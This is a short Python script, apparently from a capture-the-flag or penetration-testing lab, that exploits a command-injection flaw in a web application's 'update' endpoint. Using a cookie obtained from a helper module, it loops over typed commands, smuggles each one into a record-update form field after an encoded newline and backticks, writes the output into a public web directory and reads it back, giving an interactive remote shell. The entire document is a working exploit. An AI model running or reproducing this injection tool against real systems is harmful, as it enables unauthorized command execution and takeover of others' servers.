import DecodingRackCookie as decoding
import requests

URL = decoding.URL.replace('login','update')
cookie = ''

file_name = 'yusupov.txt'
path_file_on_server = '/var/www/public/{0}'.format(file_name)
file_url = URL.replace('update',file_name)

if (decoding.admin_response.status_code == requests.codes.ok):
    cookie = decoding.new_cookie 

while 1:
    print("cmd > ")
    cmd = input()
    
    if(cmd == "exit"):
        break
    
    post = "id=1&name=webmail&ttl=600&ip=192.168.3.10%0a"
    post += "`{0} > {1}`".format(cmd, path_file_on_server)
    
    response = requests.post(URL, data=post, cookies=decoding.cookies,allow_redirects=True)
    if (response.text.find("Invalid data provided") != -1):
        print("Error processing the command")
        
    response = requests.get(file_url)
    print(response.text)
    